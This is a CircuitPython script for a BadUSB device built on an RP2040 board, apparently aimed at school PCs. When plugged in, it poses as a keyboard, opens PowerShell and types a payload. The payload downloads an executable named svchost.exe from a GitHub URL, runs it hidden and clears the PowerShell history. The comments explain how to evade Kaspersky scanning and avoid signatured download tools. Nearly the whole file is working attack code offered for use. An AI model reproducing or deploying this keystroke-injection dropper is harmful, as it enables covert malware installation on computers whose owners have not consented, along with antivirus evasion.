# BadUSB v3 — RP2040 BOOT+RESET Board
# Plug → enumerate HID → neutralize Caps Lock → PowerShell → download + execute implant
#
# v3 CHANGES from v2 (based on adversarial analysis):
# - Caps Lock neutralized BEFORE any typing (was 82% corruption bug)
# - iwr → WebClient → bitsadmin fallback chain (certutil was signatured LOLBin)
# - Retry loop in PS (6 attempts × 3s = 18s coverage)
# - Start-Process -WindowStyle Hidden + exit (was bare Start-Process)
# - LED error signal: fast blink = download failed
# - ENUM_WAIT 5s → 8s (Kaspersky USB scanning on school PCs)
# - v3.1: payload blasts at max speed (write() handles char sequencing).
#   Per-char delays removed — 22s visible typing was too slow.

import time
import board
import digitalio
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# ── LED ───────────────────────────────────────────────
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

def pulse(n=1, fast=False):
    d = 0.05 if fast else 0.15
    for _ in range(n):
        led.value = True; time.sleep(d)
        led.value = False; time.sleep(d)

# ── CONFIG ─────────────────────────────────────────────
EXE_URL = "https://github.com/vLoon-jpg/edu-virus/releases/latest/download/svchost.exe"
ENUM_WAIT = 8.0  # school PC + Kaspersky USB scanning
PS_WAIT = 4.0    # time for PowerShell to open
# ────────────────────────────────────────────────────────

# Boot flash
pulse(3, fast=True)

# ═══ PHASE 0: USB HID enumeration ════════════════════
# Critical wait. Kaspersky scans the CIRCUITPY filesystem
# (even with boot.py, it sees a composite device).
time.sleep(ENUM_WAIT)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
pulse(1)  # HID ready

# ═══ PHASE 0.5: Caps Lock neutralization ══════════════
# Caps Lock on = 82% payload corruption. Force it OFF.
# Toggle ON then OFF (idempotent — works regardless of state).
kbd.press(Keycode.CAPS_LOCK)
time.sleep(0.05)
kbd.release_all()
time.sleep(0.05)
kbd.press(Keycode.CAPS_LOCK)
time.sleep(0.05)
kbd.release_all()
time.sleep(0.1)

# ═══ PHASE 1: Win+R → "powershell" → Enter ════════════
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()
time.sleep(0.4)

# Blast "powershell" fast — no point being slow here
layout.write("powershell")
time.sleep(0.15)

kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

pulse(2)  # PS launched

# ═══ PHASE 2: Wait for PowerShell ══════════════════════
time.sleep(PS_WAIT)

# ═══ PHASE 3: Type the payload ════════════════════════
# Retry loop + three download methods + hidden window + cleanup.
# WebClient fallback instead of certutil (certutil is a known LOLBin).
# bitsadmin as third fallback (ships with Win10, less signatured).

PAYLOAD = (
    "$u='{URL}';"
    "$p=\"$env:TEMP\\svchost.exe\";"
    "for($i=0;$i -lt 6 -and !(Test-Path $p);$i++){{"
    "try{{iwr -Uri $u -OutFile $p -UseBasicParsing}}catch{{}};"
    "if(!(Test-Path $p)){{try{{(New-Object Net.WebClient).DownloadFile($u,$p)}}catch{{}}}};"
    "if(!(Test-Path $p)){{try{{bitsadmin /transfer dl /download /priority high $u $p|Out-Null}}catch{{}}}};"
    "if(!(Test-Path $p)){{sleep 3}}"
    "}};"
    "if(Test-Path $p){{Start-Process $p -WindowStyle Hidden}};"
    "sleep 2;"
    "try{{[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()}}catch{{}};"
    "exit"
).format(URL=EXE_URL)

# Blast the payload — max speed. The write() method handles
# character sequencing internally. No need for per-char delays.
layout.write(PAYLOAD)
time.sleep(0.15)

# Execute
kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

pulse(1)  # payload sent

# ═══ PHASE 4: Wait for download ═══════════════════════
# Retry loop handles 6 attempts × 3s = up to 18s.
# Wait 20s to cover all retries.
time.sleep(20)

# ═══ PHASE 5: Result indicator ══════════════════════
# Solid LED = attack likely completed (download may or
# may not have succeeded — PowerScript has its own retry).
# Fast blink (forever) = would indicate a fatal error,
# but we can't detect download success from CircuitPython side.
led.value = True
# Blink pattern: 3 slow pulses = "I'm done, check the target"
pulse(3)
while True:
    time.sleep(1)
